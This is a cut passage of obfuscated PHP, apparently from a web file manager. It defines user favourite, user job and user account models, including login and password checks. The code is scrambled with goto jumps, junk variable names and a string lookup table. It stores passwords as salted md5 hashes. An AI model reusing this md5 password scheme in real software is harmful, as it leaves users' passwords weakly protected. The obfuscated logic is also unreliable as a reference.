USER_ID, $e–•±”¢¹Û[440] => 0); $dŸÙõŠâÁ = $e–•±”¢¹Û[2439]; $B‰Û“×Ëç = $this->field($dŸÙõŠâÁ)->where($a’ãØ”šè)->order($e–•±”¢¹Û[2440])->select(); return $B‰Û“×Ëç ? $B‰Û“×Ëç : array(); } protected function resetCache() { } protected function listView() { goto aÖéÌ«¦ÌË; cù¤–½ñ¿: $DÔìë¹³ = array_to_keyvalue($DÔìë¹³, $eÁœ®È’ÙÛ[374]); foreach ($Aï±å–Ê as $EÍ‹»œ”  => $Fƒ™İä…³Ğ) { $f¤¤À‰ø©¦ = $DÔìë¹³[$Fƒ™İä…³Ğ[$eÁœ®È’ÙÛ[75]]]; $f¤¤À‰ø©¦ = $f¤¤À‰ø©¦ ? $f¤¤À‰ø©¦ : array(); $Aï±å–Ê[$EÍ‹»œ” ] = array_merge($f¤¤À‰ø©¦, $Fƒ™İä…³Ğ); } return $Aï±å–Ê; goto AÚÎ¶÷…¼Ô; aÖéÌ«¦ÌË: $eÁœ®È’ÙÛ =& $_SERVER[Ä¿Ş°¨]; $Aï±å–Ê = $this->listData(); $EÒƒ¥ˆÑ¯ = array_filter_by_field($Aï±å–Ê, $eÁœ®È’ÙÛ[29], $eÁœ®È’ÙÛ[387]); goto DÄ„Û•ŠØó; fèŠÂ¸¢½¡: $eƒÕ£µÇà  = array($eÁœ®È’ÙÛ[388] => array($eÁœ®È’ÙÛ[389], $a‰Œ…Â¼•—)); $DÔìë¹³ = Model($eÁœ®È’ÙÛ[746])->listSource($eƒÕ£µÇà , $EêˆÖ÷ˆèã); $DÔìë¹³ = array_merge($DÔìë¹³[$eÁœ®È’ÙÛ[73]], $DÔìë¹³[$eÁœ®È’ÙÛ[74]]); goto cù¤–½ñ¿; DÄ„Û•ŠØó: $a‰Œ…Â¼•— = array_to_keyvalue($EÒƒ¥ˆÑ¯, $eÁœ®È’ÙÛ[33], $eÁœ®È’ÙÛ[75]); if (!$a‰Œ…Â¼•—) { return $Aï±å–Ê; } $EêˆÖ÷ˆèã = 2000; goto fèŠÂ¸¢½¡; AÚÎ¶÷…¼Ô: } protected function addFav($cñ‚‡ÅĞ¯, $E£Ñè›õí­ = '', $D°¡ÉõçÈ = "\x73\157\x75\x72\143\145") { goto fôßâœ£¤ó; fôßâœ£¤ó: $B‘”«Ûø‰ =& $_SERVER[Ä¿Ş°¨]; $FÊ©Á£×ÇÎ = array($B‘”«Ûø‰[1390] => USER_ID, $B‘”«Ûø‰[440] => 0, $B‘”«Ûø‰[393] => $D°¡ÉõçÈ, $B‘”«Ûø‰[392] => $cñ‚‡ÅĞ¯); if ($this->where($FÊ©Á£×ÇÎ)->find()) { return !1; } goto dğÒ”øÀ‹²; bÖ¡Ä´…´•: return $this->add($dêäº†Ø); goto a©ÕÓÈ“­; DƒÖ¼÷ˆ±Ú: if (!$E£Ñè›õí­ && $D°¡ÉõçÈ == $B‘”«Ûø‰[387]) { $BÂ…Şìè°Ã = Model($B‘”«Ûø‰[1095])->where(array($B‘”«Ûø‰[388] => $cñ‚‡ÅĞ¯))->find(); if (!$BÂ…Şìè°Ã) { return !1; } $E£Ñè›õí­ = $BÂ…Şìè°Ã[$B‘”«Ûø‰[28]]; } $E£Ñè›õí­ = $this->getAutoName($E£Ñè›õí­); $dêäº†Ø = array($B‘”«Ûø‰[1390] => USER_ID, $B‘”«Ûø‰[440] => 0, $B‘”«Ûø‰[391] => $E£Ñè›õí­, $B‘”«Ûø‰[392] => $cñ‚‡ÅĞ¯, $B‘”«Ûø‰[393] => $D°¡ÉõçÈ, $B‘”«Ûø‰[2067] => $E¦á¸Ş®¾Ã + 1); goto bÖ¡Ä´…´•; dğÒ”øÀ‹²: $FÊ©Á£×ÇÎ = array($B‘”«Ûø‰[1390] => USER_ID, $B‘”«Ûø‰[440] => 0); $E¦á¸Ş®¾Ã = $this->where($FÊ©Á£×ÇÎ)->max($B‘”«Ûø‰[2084]); if (!$E¦á¸Ş®¾Ã) { $E¦á¸Ş®¾Ã = 0; } goto DƒÖ¼÷ˆ±Ú; a©ÕÓÈ“­: } protected function remove($FÆíëñÁŠ) { $cì«›àÆšÃ =& $_SERVER[Ä¿Ş°¨]; $AªäØ¦¥ = array($cì«›àÆšÃ[1390] => USER_ID, $cì«›àÆšÃ[390] => $FÆíëñÁŠ); return $this->where($AªäØ¦¥)->delete(); } protected function removeByName($A½¥àæ­Á) { $c¦òƒÆøæ¨ =& $_SERVER[Ä¿Ş°¨]; $A„Ÿâ©æ…× = array($c¦òƒÆøæ¨[1390] => USER_ID, $c¦òƒÆøæ¨[391] => $A½¥àæ­Á, $c¦òƒÆøæ¨[440] => 0); return $this->where($A„Ÿâ©æ…×)->delete(); } protected function rename($A İõß©Ë, $b„¶ÒÇŸù) { $e¡äÕå¹÷Ú =& $_SERVER[Ä¿Ş°¨]; if ($A İõß©Ë == $b„¶ÒÇŸù) { return !1; } $bã¦Œ¨ò ¿ = $this->getAutoName($b„¶ÒÇŸù); if ($b„¶ÒÇŸù != $bã¦Œ¨ò ¿) { return !1; } $bÚ‘ŠĞÇµé = array($e¡äÕå¹÷Ú[1390] => USER_ID, $e¡äÕå¹÷Ú[440] => 0, $e¡äÕå¹÷Ú[28] => $A İõß©Ë); return $this->where($bÚ‘ŠĞÇµé)->save(array($e¡äÕå¹÷Ú[28] => $b„¶ÒÇŸù)); } protected function resetSort($D£Ûó°µ’Ğ) { $d‰„¦óáö =& $_SERVER[Ä¿Ş°¨]; $D£Ûó°µ’Ğ = is_array($D£Ûó°µ’Ğ) ? $D£Ûó°µ’Ğ : array(); $bÙÁ½ÑïÜõ = array($d‰„¦óáö[1390] => USER_ID); for ($b›óìàè‚ = 0; $b›óìàè‚ < count($D£Ûó°µ’Ğ); $b›óìàè‚++) { $bÙÁ½ÑïÜõ[$d‰„¦óáö[390]] = $D£Ûó°µ’Ğ[$b›óìàè‚]; $this->where($bÙÁ½ÑïÜõ)->save(array($d‰„¦óáö[2067] => $b›óìàè‚ + 1)); } return !0; } protected function moveTop($aì¶Øğ‘š´) { goto a„ƒî´‡‰; cºÕÔ·§‡Ğ: return $this->resetSort($b‘ÏšòŒÅ); goto D÷°åä‚‡; Cˆºáõ»ê…: if (!$c§Î³ŒÄÖ) { return; } $b‘ÏšòŒÅ = $this->field($Dß×éœŠÖ[372])->where($døòš¤˜‚›)->order($Dß×éœŠÖ[2440])->select(); $b‘ÏšòŒÅ = array_to_keyvalue($b‘ÏšòŒÅ, $Dß×éœŠÖ[33], $Dß×éœŠÖ[372]); goto AĞ•ãÁ¼©; AĞ•ãÁ¼©: $EìĞÜ»ÌŸ­ = $b‘ÏšòŒÅ; $b‘ÏšòŒÅ = array_remove_value($b‘ÏšòŒÅ, $c§Î³ŒÄÖ[$Dß×éœŠÖ[372]]); array_unshift($b‘ÏšòŒÅ, $c§Î³ŒÄÖ[$Dß×éœŠÖ[372]]); goto cºÕÔ·§‡Ğ; a„ƒî´‡‰: $Dß×éœŠÖ =& $_SERVER[Ä¿Ş°¨]; $døòš¤˜‚› = array($Dß×éœŠÖ[1390] => USER_ID, $Dß×éœŠÖ[440] => 0); $c§Î³ŒÄÖ = $this->where($døòš¤˜‚›)->where(array($Dß×éœŠÖ[28] => $aì¶Øğ‘š´))->find(); goto Cˆºáõ»ê…; D÷°åä‚‡: } protected function moveBottom($eƒÂâ†­°º) { $a¡î¸Ÿ—ƒã =& $_SERVER[Ä¿Ş°¨]; $C–Œƒ£‚‘õ = array($a¡î¸Ÿ—ƒã[1390] => USER_ID, $a¡î¸Ÿ—ƒã[440] => 0); $D¼ìô§àµ” = $this->where($C–Œƒ£‚‘õ)->max($a¡î¸Ÿ—ƒã[2084]); $aãÚŠºç£† = array($a¡î¸Ÿ—ƒã[2084] => $D¼ìô§àµ” + 1); return $this->where($C–Œƒ£‚‘õ)->where(array($a¡î¸Ÿ—ƒã[28] => $eƒÂâ†­°º))->save($aãÚŠºç£†); } private function getAutoName($aÔÆ¨Ê˜½ ) { goto B°‰ñíœŒÖ; A—¬…¥™Œ: return $aÔÆ¨Ê˜½  . "\50{$C‡ÊåÁ³ÈÓ}\51"; goto Dß®İäñïç; B°‰ñíœŒÖ: $fÀµî¬Àˆç =& $_SERVER[Ä¿Ş°¨]; $aÙ©ñÎÌåè = array($fÀµî¬Àˆç[1390] => USER_ID, $fÀµî¬Àˆç[440] => 0); $a…œ ƒçİ = $this->field($fÀµî¬Àˆç[28])->where($aÙ©ñÎÌåè)->select(); goto A‚’è¼¹…º; A‚’è¼¹…º: $a…œ ƒçİ = array_to_keyvalue($a…œ ƒçİ, $fÀµî¬Àˆç[33], $fÀµî¬Àˆç[28]); if (!$a…œ ƒçİ || !in_array($aÔÆ¨Ê˜½ , $a…œ ƒçİ)) { return $aÔÆ¨Ê˜½ ; } for ($C‡ÊåÁ³ÈÓ = 0; $C‡ÊåÁ³ÈÓ < count($a…œ ƒçİ); $C‡ÊåÁ³ÈÓ++) { if (!in_array($aÔÆ¨Ê˜½  . "\50{$C‡ÊåÁ³ÈÓ}\51", $a…œ ƒçİ)) { return $aÔÆ¨Ê˜½  . "\50{$C‡ÊåÁ³ÈÓ}\51"; } } goto A—¬…¥™Œ; Dß®İäñïç: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x6a\157\x62\x4c\x69\163\x74"; public $field = array("\x6e\x61\155\145", "\x64\x65\163\x63", "\x73\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\146\112\x6f\142\x4c\x69\163\164"; public function listData($fë¢¶àÌÇ = false, $E‰œäáÙÀ = "\x73\x6f\x72\164", $F„½¸‡™î³ = false) { return parent::listData($fë¢¶àÌÇ, $E‰œäáÙÀ, $F„½¸‡™î³); } public function remove($bßàù ã¨·) { return parent::remove($bßàù ã¨·); } public function add($bŞéîóÄĞŸ) { $cöÏ“‹İÌ =& $_SERVER[Ä¿Ş°¨]; if ($this->findByName($bŞéîóÄĞŸ[$cöÏ“‹İÌ[28]])) { return !1; } $bŞéîóÄĞŸ[$cöÏ“‹İÌ[2084]] = $this->getSort(); return parent::insert($bŞéîóÄĞŸ); } private function getSort() { $bî’ïÇÜÌ‹ =& $_SERVER[Ä¿Ş°¨]; $dàŠ§¬÷‡ = parent::listData(); $BˆĞŞôÆƒí = array_to_keyvalue($dàŠ§¬÷‡, $bî’ïÇÜÌ‹[33], $bî’ïÇÜÌ‹[2084]); return empty($BˆĞŞôÆƒí) ? 0 : max($BˆĞŞôÆƒí) + 1; } public function update($BÆ¥ˆ—©‚©, $D¦ß†Ú¨æÎ) { $e”×ÔÕĞÒŞ =& $_SERVER[Ä¿Ş°¨]; $B¦èÇá§…‚ = parent::listData($BÆ¥ˆ—©‚©); $e‘„ÏÆÓ¨¡ = $this->findByName($D¦ß†Ú¨æÎ[$e”×ÔÕĞÒŞ[28]]); if (!$B¦èÇá§…‚ || $e‘„ÏÆÓ¨¡ && $e‘„ÏÆÓ¨¡[$e”×ÔÕĞÒŞ[372]] != $B¦èÇá§…‚[$e”×ÔÕĞÒŞ[372]]) { return !1; } return parent::update($BÆ¥ˆ—©‚©, $D¦ß†Ú¨æÎ); } public function setUserJob($a¹‹Æ¡‰¿Á, $cÍ„½©‘—ç) { goto B‘­‚õºÑä; fø¨¯§£ÙŠ: $eİœÇÈùé¦ = array_to_keyvalue($d¡êÖ¤¹ º, $d½‘Ğ¬¶ÌÕ[28]); $b‚‹Î‰‰˜ = $d½‘Ğ¬¶ÌÕ[357]; foreach ($cÍ„½©‘—ç as $dœ•ç–ˆ—Ú) { if ($eİœÇÈùé¦[$dœ•ç–ˆ—Ú]) { $b‚‹Î‰‰˜ .= $eİœÇÈùé¦[$dœ•ç–ˆ—Ú][$d½‘Ğ¬¶ÌÕ[372]] . $d½‘Ğ¬¶ÌÕ[47]; } else { $B¾òòá²Ÿ« = $this->add($dœ•ç–ˆ—Ú); $b‚‹Î‰‰˜ .= $B¾òòá²Ÿ« . $d½‘Ğ¬¶ÌÕ[47]; } } goto cˆ¹‘ÔÒÖ×; B‘­‚õºÑä: $d½‘Ğ¬¶ÌÕ =& $_SERVER[Ä¿Ş°¨]; if (!is_array($cÍ„½©‘—ç)) { $cÍ„½©‘—ç = array($cÍ„½©‘—ç); } $d¡êÖ¤¹ º = parent::listData(); goto fø¨¯§£ÙŠ; cˆ¹‘ÔÒÖ×: $b‚‹Î‰‰˜ = rtrim($b‚‹Î‰‰˜, $d½‘Ğ¬¶ÌÕ[47]); Model($d½‘Ğ¬¶ÌÕ[481])->metaSet($a¹‹Æ¡‰¿Á, self::JOB_KEY, $b‚‹Î‰‰˜); goto d°‹¾ï¡›ä; d°‹¾ï¡›ä: } public function getUserJob($c¦’¡¨ÃŠ“) { $eÖ¢ğè£´ = Model($_SERVER[Ä¿Ş°¨][481])->metaGet($c¦’¡¨ÃŠ“); return $this->getUserJobInfo($eÖ¢ğè£´[self::JOB_KEY]); } public function getUserJobInfo($BŠÊôóÈŠò) { goto EÕÓÃ™¥ŠÌ; C®‹¶Â¼ô: $C´˜¾öÚ¼ğ = array_remove_key($C´˜¾öÚ¼ğ, $Fãù”Ìæ¾Ì[183]); $càº¨Ó­° = array(); foreach ($Fšòîùí«À as $dÑãïÀÔ«) { if (isset($C´˜¾öÚ¼ğ[$dÑãïÀÔ«])) { $càº¨Ó­°[] = $C´˜¾öÚ¼ğ[$dÑãïÀÔ«]; } } goto e‡ï¨·è; e‡ï¨·è: return $càº¨Ó­°; goto f®è¯Ã‡–; EÕÓÃ™¥ŠÌ: $Fãù”Ìæ¾Ì =& $_SERVER[Ä¿Ş°¨]; $Fšòîùí«À = explode($Fãù”Ìæ¾Ì[47], $BŠÊôóÈŠò); $C´˜¾öÚ¼ğ = parent::listData(); goto C®‹¶Â¼ô; f®è¯Ã‡–: } } class UserModel extends ModelBase { protected $tableName = "\165\163\x65\162"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\x6d\145" => "\x75\163\x65\162\137\x6d\145\164\141", "\155\x65\164\x61\106\x69\x65\x6c\144" => "\165\x73\145\162\x49\x44"); protected $simpleField = "\165\163\145\162\x49\x44\54\156\151\143\153\116\141\x6d\x65\54\x6e\141\x6d\145\x2c\141\x76\141\x74\x61\x72\x2c\x73\145\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($DÄö¡ˆòŸÌ) { $aŠ†­˜ñ =& $_SERVER[Ä¿Ş°¨]; $CºöÃİö‹ = $aŠ†­˜ñ[2441]; return array($aŠ†­˜ñ[2129] => array($DÄö¡ˆòŸÌ[0], $CºöÃİö‹), $aŠ†­˜ñ[2131] => array($DÄö¡ˆòŸÌ[0], $CºöÃİö‹), $aŠ†­˜ñ[2442] => array($DÄö¡ˆòŸÌ[0], $CºöÃİö‹)); } protected function getInfo($aİãùËÅç, $BÀÌŸòõÕ× = false) { $C­Ô³¨‘ÈÀ = $this->getInfoSimple($aİãùËÅç); if (!is_array($C­Ô³¨‘ÈÀ)) { return array(); } if ($BÀÌŸòõÕ×) { return $this->_getInfoApply($C­Ô³¨‘ÈÀ); } return $this->cacheFunctionGet($_SERVER[Ä¿Ş°¨][2171], $aİãùËÅç); } protected function getInfoFull($Bé«¼µ´Ä—, $Fˆàš­æÛ— = false) { $EÁİš—ù¸„ = $this->getInfoSimple($Bé«¼µ´Ä—); if (!is_array($EÁİš—ù¸„)) { return array(); } if ($Fˆàš­æÛ—) { return $this->_getInfoApply($EÁİš—ù¸„, !0); return $this->_getInfoApply($EÁİš—ù¸„, !0); } return $this->cacheFunctionGet($_SERVER[Ä¿Ş°¨][2443], $Bé«¼µ´Ä—); } private function _getInfoApply($EÍ÷ŒÉÊƒÇ, $Aí¼È®öõ = false) { goto d‹ò« õÁ; c¾½Š«ŒŠì: $EÍ÷ŒÉÊƒÇ = $this->_listDataApplyItem($EÍ÷ŒÉÊƒÇ); $D ‡ª×¢§Å = Model($cË¦—×¸½[1095])->metaGet($EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[396]][$cË¦—×¸½[374]]); $EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[2446]] = $aŠ™é‚æ•¡; goto CÕÀ·¢—Ğã; CÕÀ·¢—Ğã: $EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[396]][$cË¦—×¸½[2279]] = isset($D ‡ª×¢§Å[$cË¦—×¸½[2280]]) ? $D ‡ª×¢§Å[$cË¦—×¸½[2280]] : null; if ($Aí¼È®öõ) { $EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[421]] = $this->metaGet($EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[1399]]); } return $EÍ÷ŒÉÊƒÇ; goto e¼é£¹æ­; d‹ò« õÁ: $cË¦—×¸½ =& $_SERVER[Ä¿Ş°¨]; if (!$EÍ÷ŒÉÊƒÇ) { return $EÍ÷ŒÉÊƒÇ; } $aŠ™é‚æ•¡ = md5($cË¦—×¸½[2444] . $EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[789]] . $cË¦—×¸½[2445] . $EÍ÷ŒÉÊƒÇ[$cË¦—×¸½[28]]); goto c¾½Š«ŒŠì; e¼é£¹æ­: } protected function getInfoSimple($eãğ¶Î¿Ã, $bìÌÃ²šÛ = false) { $A½§ÈØÜ¯è =& $_SERVER[Ä¿Ş°¨]; if (!$eãğ¶Î¿Ã) { return array(); } if ($bìÌÃ²šÛ) { $AÜáõÖ‹±É = $this->where(array($A½§ÈØÜ¯è[1399] => intval($eãğ¶Î¿Ã)))->find(); if (!is_array($AÜáõÖ‹±É)) { return array(); } $AÜáõÖ‹±É[$A½§ÈØÜ¯è[2447]] = Action($A½§ÈØÜ¯è[2448])->parseUrl($AÜáõÖ‹±É[$A½§ÈØÜ¯è[2447]]); return $AÜáõÖ‹±É; } return $this->cacheFunctionGet($A½§ÈØÜ¯è[2132], $eãğ¶Î¿Ã); } protected function getInfoSimpleOuter($Dø˜‚è ‰) { goto A†ããÉÑ­Î; fÅ²Œõ·Ğô: $fÍÈ˜‰¯Ôé = array_field_key($Aº¥ºˆØÙì, explode($e»ª‚Æ ¿•[47], $this->simpleField)); if (!$fÍÈ˜‰¯Ôé) { return array($e»ª‚Æ ¿•[1399] => $e»ª‚Æ ¿•[1016], $e»ª‚Æ ¿•[28] => $e»ª‚Æ ¿•[153] . LNG($e»ª‚Æ ¿•[2451]) . $e»ª‚Æ ¿•[480], $e»ª‚Æ ¿•[2447] => STATIC_PATH . $e»ª‚Æ ¿•[2452]); } $fÍÈ˜‰¯Ôé[$e»ª‚Æ ¿•[2447]] = Action($e»ª‚Æ ¿•[2448])->parseUrl($fÍÈ˜‰¯Ôé[$e»ª‚Æ ¿•[2447]]); goto D™ÄÎ¦“Ä“; D™ÄÎ¦“Ä“: return $fÍÈ˜‰¯Ôé; goto fíÕ‘Ê¼; A†ããÉÑ­Î: $e»ª‚Æ ¿• =& $_SERVER[Ä¿Ş°¨]; if (!$Dø˜‚è ‰ || $Dø˜‚è ‰ == 0) { return array($e»ª‚Æ ¿•[1399] => $e»ª‚Æ ¿•[472], $e»ª‚Æ ¿•[28] => $e»ª‚Æ ¿•[153] . LNG($e»ª‚Æ ¿•[2449]) . $e»ª‚Æ ¿•[480], $e»ª‚Æ ¿•[2447] => STATIC_PATH . $e»ª‚Æ ¿•[2450]); } $Aº¥ºˆØÙì = $this->cacheFunctionGet($e»ª‚Æ ¿•[2132], $Dø˜‚è ‰); goto fÅ²Œõ·Ğô; fíÕ‘Ê¼: } protected function groupUser($cÓàÅù‚ØÇ) { } public static function errorLang($aöÁÏÔ´Ÿ) { $Bí¹ìÕÜ° =& $_SERVER[Ä¿Ş°¨]; $Eä´Âº©» = array(self::ERROR_USER_NOT_EXISTS => $Bí¹ìÕÜ°[2453], self::ERROR_USER_PASSWORD_ERROR => $Bí¹ìÕÜ°[2454], self::ERROR_USER_EXIST_NAME => $Bí¹ìÕÜ°[2455], self::ERROR_USER_EXIST_PHONE => $Bí¹ìÕÜ°[2456], self::ERROR_USER_EXIST_EMAIL => $Bí¹ìÕÜ°[2457], self::ERROR_USER_LOGIN_LOCK => $Bí¹ìÕÜ°[2458], self::ERROR_IP_NOT_ALLOW => $Bí¹ìÕÜ°[2459], self::ERROR_USER_EXIST_NICKNAME => $Bí¹ìÕÜ°[2460]); return LNG($Eä´Âº©»[$aöÁÏÔ´Ÿ]); } public function getInfoByMeta($d‘¥ÇóÓíÓ, $B˜«”¤Ãõ) { $c¯–Ê³‡ª¯ =& $_SERVER[Ä¿Ş°¨]; $bè¯ÆáìÁ = Model($c¯–Ê³‡ª¯[2461])->where(array($c¯–Ê³‡ª¯[89] => $d‘¥ÇóÓíÓ, $c¯–Ê³‡ª¯[355] => $B˜«”¤Ãõ))->find(); if ($bè¯ÆáìÁ) { return $this->getInfo($bè¯ÆáìÁ[$c¯–Ê³‡ª¯[1399]]); } return !1; } public function userLoginCheck($FÀ¸´Ë‘ÆÉ, $bè÷ë°Êù) { goto e‘ˆ«³ÑÒ; e‘ˆ«³ÑÒ: $AìãÈÁÔ›› =& $_SERVER[Ä¿Ş°¨]; $A©·ö¨Ó‡ = array($AìãÈÁÔ››[28] => $FÀ¸´Ë‘ÆÉ, $AìãÈÁÔ››[2283] => $FÀ¸´Ë‘ÆÉ, $AìãÈÁÔ››[289] => $FÀ¸´Ë‘ÆÉ, $AìãÈÁÔ››[2462] => $FÀ¸´Ë‘ÆÉ, $AìãÈÁÔ››[901] => $AìãÈÁÔ››[903]); if ($this->nickNameRpt()) { unset($A©·ö¨Ó‡[$AìãÈÁÔ››[2283]]); } goto a‘§Ú®„õÖ; B¡Úë„ ¨: $this->userEdit($a˜ùğù¡÷†[$AìãÈÁÔ››[1399]], array($AìãÈÁÔ››[2463] => time())); $this->clearCache($a˜ùğù¡÷†[$AìãÈÁÔ››[1399]]); return $this->getInfo($a˜ùğù¡÷†[$AìãÈÁÔ››[1399]]); goto Fø×ªºïæÑ; a‘§Ú®„õÖ: $a˜ùğù¡÷† = $this->where($A©·ö¨Ó‡)->find(); if (!$a˜ùğù¡÷†) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($a˜ùğù¡÷†[$AìãÈÁÔ››[1399]], $bè÷ë°Êù)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto B¡Úë„ ¨; Fø×ªºïæÑ: } public function clearCache($aº–ğùôñ) { $déõ¼Ú˜» =& $_SERVER[Ä¿Ş°¨]; $this->cacheFunctionClear($déõ¼Ú˜»[2171], $aº–ğùôñ); $this->cacheFunctionClear($déõ¼Ú˜»[2132], $aº–ğùôñ); } public function userPasswordCheck($cä¯…«Óçå, $fé‘«É¯®) { $cŠí¥Ûï =& $_SERVER[Ä¿Ş°¨]; $F²¿ïÛ“ù = $this->where(array($cŠí¥Ûï[1399] => intval($cä¯…«Óçå)))->find(); $BÁ†Ó’£—­ = $this->metaGet($cä¯…«Óçå); $d˜•®Õ¤İ‚ = isset($BÁ†Ó’£—­[$cŠí¥Ûï[2464]]) ? $BÁ†Ó’£—­[$cŠí¥Ûï[2464]] : $cŠí¥Ûï[33]; if (md5($d˜•®Õ¤İ‚ . trim($fé‘«É¯®)) !== $F²¿ïÛ“ù[$cŠí¥Ûï[789]]) { return !1; } return !0; } public function userAdd($A†“Ö¿‡ñ“) { goto bÅ¿Ö ¥ª; d‘éãÒ‡Î: $bšéíØš‹ = array($f¬”ÓÚÚª[2473] => $fì”ˆ£ˆä[$f¬”ÓÚÚª[789]], $f¬”ÓÚÚª[2469] => $fì”ˆ£ˆä[$f¬”ÓÚÚª[2283]]); $this->userEdit($cÜÍßïÍ¾¬, $bšéíØš‹); Model($f¬”ÓÚÚª[1095])->userRootAdd($cÜÍßïÍ¾¬); goto c½‰Ñß˜¼ë; c½‰Ñß˜¼ë: return $cÜÍßïÍ¾¬; goto A®ÑƒŠîŠŒ; C§›¦Ä¥Å: $aŸæª”“à = $this->_checkExist($A†“Ö¿‡ñ“); if ($aŸæª”“à !== !0) { return $aŸæª”“à; } $cÜÍßïÍ¾¬ = $this->add($fì”ˆ£ˆä); goto d‘éãÒ‡Î; bÅ¿Ö ¥ª: $f¬”ÓÚÚª =& $_SERVER[Ä¿Ş°¨]; $fì”ˆ£ˆä = array($f¬”ÓÚÚª[391] => $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[28]], $f¬”ÓÚÚª[2465] => $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2466]], $f¬”ÓÚÚª[2467] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[289]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[289]] : $f¬”ÓÚÚª[33], $f¬”ÓÚÚª[2468] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2462]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2462]] : $f¬”ÓÚÚª[33], $f¬”ÓÚÚª[2469] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2283]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2283]] : $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[28]], $f¬”ÓÚÚª[2470] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2447]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2447]] : $f¬”ÓÚÚª[33], $f¬”ÓÚÚª[2471] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2472]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2472]] : 1, $f¬”ÓÚÚª[2473] => $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[789]], $f¬”ÓÚÚª[2133] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2047]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[2047]] : 1024 * 1024 * 20, $f¬”ÓÚÚª[2134] => 0, $f¬”ÓÚÚª[2463] => 0, $f¬”ÓÚÚª[2158] => isset($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[683]]) ? $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[683]] : 1); if (!empty($A†“Ö¿‡ñ“[$f¬”ÓÚÚª[1399]])) { $fì”ˆ£ˆä[$f¬”ÓÚÚª[1399]] = $A†“Ö¿‡ñ“[$f¬”ÓÚÚª[1399]]; } goto C§›¦Ä¥Å; A®ÑƒŠîŠŒ: } protected function userEditTest($fºâî½Õ , $D´”¥‡© µ) { return $this->call($_SERVER[Ä¿Ş°¨][2474], $fºâî½Õ , $D´”¥‡© µ); } protected function userEdit($DÇº¡‡‰´ç, $dÖÔÀêàæ) { goto d„®•˜™Æ•; d„®•˜™Æ•: $B„‰ñ÷¢‹Î =& $_SERVER[Ä¿Ş°¨]; $DìˆÀçÉîŞ = $this->getInfoSimple($DÇº¡‡‰´ç); if (!$DìˆÀçÉîŞ) { return !1; } goto AŒÊÁ½í–ˆ; DÎÜ‡è¤—ô: $this->where(array($B„‰ñ÷¢‹Î[1390] => $DÇº¡‡‰´ç))->save($dÖÔÀêàæ); if (isset($dÖÔÀêàæ[$B„‰ñ÷¢‹Î[2283]])) { $this->setNamePinyin($DÇº¡‡‰´ç, $dÖÔÀêàæ[$B„‰ñ÷¢‹Î[2283]]); } return !0; goto D†”°…äè; AŒÊÁ½í–ˆ: $f«°œ©òø– = $this->_checkExist($dÖÔÀêàæ, $DÇº¡‡‰´ç); if ($f«°œ©òø– !== !0) { return $f«°œ©òø–; } if (isset($dÖÔÀêàæ[$B„‰ñ÷¢‹Î[789]]) && trim($dÖÔÀêàæ[$B„‰ñ÷¢‹Î[789]]) != $B„‰ñ÷¢‹Î[33]) { $añŞ¯…ËÆ­ = $this->metaGet($DÇº¡‡‰´ç); if (empty($añŞ¯…ËÆ­[$B„‰ñ÷¢‹Î[2464]])) { $añŞ¯…ËÆ­[$B„‰ñ÷¢‹Î[2464]] = rand_string(10); Model($B„‰ñ÷¢‹Î[478])->metaSet($DÇº¡‡‰´ç, $B„‰ñ÷¢‹Î[2464], $añŞ¯…ËÆ­[$B„‰ñ÷¢‹Î[2464]]); } $dÖÔÀêàæ[$B„‰ñ÷¢‹Î[789]] = md5($añŞ¯…ËÆ­[$B„‰ñ÷¢‹Î[2464]] . trim($dÖÔÀêàæ[$B„‰ñ÷¢‹Î[789]])); } else { unset($dÖÔÀêàæ[$B„‰ñ÷¢‹Î[789]]); } goto DÎÜ‡è¤—ô; D†”°…äè: } public function setNamePinyin($a«Üš£µ„Ö, $cÓ™ÆÉö‹¨ = false) { $dŞ…¥†âÂÍ =& $_SERVER[Ä¿Ş°¨]; if (!$cÓ™ÆÉö‹¨) { $eôâò¶ãè£ = $this->getInfoSimple($a«Üš£µ„Ö); $cÓ™ÆÉö‹¨ = $eôâò¶ãè£[$dŞ…¥†âÂÍ[2283]] ? $eôâò¶ãè£[$dŞ…¥†âÂÍ[2283]] : $eôâò¶ãè£[$dŞ…¥†âÂÍ[28]]; } $fïÎ‡—ç¥² = Model($dŞ…¥†âÂÍ[481]); if (!Input::check($cÓ™ÆÉö‹¨, $dŞ…¥†âÂÍ[532])) { return $fïÎ‡—ç¥²->metaSet($a«Üš£µ„Ö, array($dŞ…¥†âÂÍ[420] => $dŞ…¥†âÂÍ[33], $dŞ…¥†âÂÍ[419] => $dŞ…¥†âÂÍ[33])); } return 